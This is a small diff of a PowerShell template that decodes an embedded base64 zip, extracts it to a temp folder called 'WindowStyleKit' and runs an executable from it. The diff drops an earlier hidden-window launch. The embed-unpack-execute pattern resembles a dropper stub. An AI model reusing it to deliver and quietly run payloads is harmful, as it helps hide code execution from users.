@@ -1,4 +1,5 @@
 $exec = %exec%
+$folder = %folder%
 $base64String = %b64zip%
 
 $temp = New-TemporaryFile
@@ -14,5 +15,5 @@ Set-Content -Path $tempName -Value $bytes -Encoding Byte
 Expand-Archive -Path $tempName -DestinationPath (Join-Path $temp_path "WindowStyleKit")
 Remove-Item $tempName
 
-Set-Location temp_path\WindowStyleKit
-Start-Process $exec -WindowStyle Hidden
+Set-Location $temp_path\WindowStyleKit
+.\$exec
